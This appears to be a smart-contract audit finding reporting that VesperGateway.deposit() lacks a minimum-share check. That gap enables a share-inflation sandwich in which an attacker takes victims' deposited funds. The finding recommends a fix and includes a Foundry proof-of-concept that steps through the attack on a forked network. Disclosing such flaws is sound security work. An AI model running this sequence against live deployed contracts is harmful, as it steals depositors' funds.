### Title
Missing minimum vault-share slippage check enables sandwich theft through Vesper deposits - ([File: `contracts/VesperGateway.sol`](contracts/VesperGateway.sol))

### Summary
`VesperGateway.deposit()` converts a caller-supplied amount of a Vesper pool’s underlying token into vToken shares and deposits all received shares into the corresponding Metronome `DepositToken`. The function accepts no minimum vToken output, so an attacker can inflate the Vesper share price between the victim’s quote and transaction, causing the victim to receive negligible collateral value while the attacker later redeems the victim’s contributed underlying.

### Finding Description
The public `deposit()` entry point accepts only `pool_`, `vToken_`, and `amount_`; it has no `minVTokenOut`, deadline, or other slippage bound. [1](#0-0)  It first pulls the full underlying `amount_` from the caller and then deposits that amount into the attacker-manipulable external `IVPool`. [2](#0-1)  The gateway measures only the balance delta of minted vTokens and deposits whatever amount was received, even if it is only one unit. [3](#0-2)  `IVPool.deposit(uint256)` likewise has no output parameter, while `IVPool.withdraw(uint256)` redeems shares for the pool’s current underlying value. [4](#0-3) 

The victim therefore fixes the amount of underlying contributed but not the amount of shares received. If a Vesper pool calculates shares from current underlying assets, an unprivileged account can first acquire shares, donate underlying directly to the pool to increase its total value, and let the victim’s subsequent deposit mint disproportionately few shares. Metronome then treats the resulting tiny vToken amount as the collateral deposit because `DepositToken.deposit()` transfers the provided underlying amount and mints msdTokens according to that actual amount. [5](#0-4)  Production configuration registers Vesper assets such as `vaETH` as deposit-token collateral. [6](#0-5) 

### Impact Explanation
The victim’s underlying tokens remain inside the Vesper pool, but the victim receives only a small number of vTokens and corresponding msdTokens. Because the attacker owns the overwhelming majority of the inflated share supply, calling `vToken_.withdraw(shares)` redeems the attacker’s shares for almost all underlying held by the pool, including the victim’s contribution. This is direct theft of user funds through a same-block or same-bundle price/share-rate sandwich, rather than merely an unfavorable trade on a user-specified AMM path.

### Likelihood Explanation
The attack requires only ordinary public calls: deposit into the target Vesper pool, transfer underlying tokens directly to that pool to raise its assets per share, place the victim’s observed `VesperGateway.deposit()` call in between, and withdraw the attacker’s shares afterward. No privileged Metronome role, incorrect oracle, governance change, malicious bridge endpoint, or special contract functionality is required. The victim’s approval of `VesperGateway` is already necessary for normal use, and the gateway contains no check that would reject an unexpectedly small vToken delta. [7](#0-6) 

### Recommendation
Add a caller-controlled minimum-output parameter, for example `minVTokenAmount_`, to `VesperGateway.deposit()`. After calculating the vToken balance delta, revert when it is below the caller’s bound:

```solidity
function deposit(
    IPool pool_,
    IVPool vToken_,
    uint256 amount_,
    uint256 minVTokenAmount_
) external {
    ...
    uint256 vTokenAmount = vToken_.balanceOf(address(this)) - balanceBefore;
    if (vTokenAmount < minVTokenAmount_) {
        revert VTokenSlippageTooHigh();
    }
    ...
}
```

A deadline may also be included if transactions are expected to remain executable across multiple blocks. The same consideration applies to any gateway path that converts a fixed input amount through an external share-pricing mechanism without exposing a minimum result.

### Proof of Concept
The following Foundry-style sequence is reproducible on a fork using a deployed registered Metronome pool, its registered Vesper collateral, and two funded accounts. Concrete addresses should be taken from the selected network’s deployment metadata and a whale or balance-dealing helper used to fund `underlying`:

```solidity
function testVesperDepositShareInflationSandwich() public {
    uint256 attackerDeposit = 1e18;
    uint256 donation = 10_000e18;
    uint256 victimDeposit = 1_000e18;

    // Victim intends to route `victimDeposit` through the gateway.
    vm.prank(victim);
    underlying.approve(address(vesperGateway), victimDeposit);

    // 1. Attacker owns vault shares before inflating the pool.
    vm.startPrank(attacker);
    underlying.approve(address(vToken), attackerDeposit);
    vToken.deposit(attackerDeposit);
    uint256 attackerShares = vToken.balanceOf(attacker);

    // 2. Donate underlying to sharply increase assets per vToken share.
    underlying.transfer(address(vToken), donation);
    vm.stopPrank();

    // 3. Victim pays `victimDeposit` but receives nearly no shares.
    uint256 msdBefore = msdToken.balanceOf(victim);
    vm.prank(victim);
    vesperGateway.deposit(pool, IVPool(address(vToken)), victimDeposit);
    uint256 victimMsdReceived = msdToken.balanceOf(victim) - msdBefore;

    // Use an inflation ratio that leaves a nonzero but economically negligible result.
    assertLt(victimMsdReceived, victimDeposit / 1_000);

    // 4. Attacker redeems their dominant share position and captures victim funds.
    uint256 underlyingBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    vToken.withdraw(attackerShares);

    assertGt(
        underlying.balanceOf(attacker) - underlyingBefore,
        attackerDeposit + donation + victimDeposit - 1e12
    );
}
```

The essential assertion is that the attacker ends with the attacker deposit, donation, and almost all of the victim’s contributed underlying, while the victim receives only an economically negligible msdToken balance. The exact donation amount must be adjusted to the selected Vesper pool’s decimals, accounting rules, and rounding so that the victim still receives a nonzero share amount and `DepositToken.deposit()` does not revert on zero.
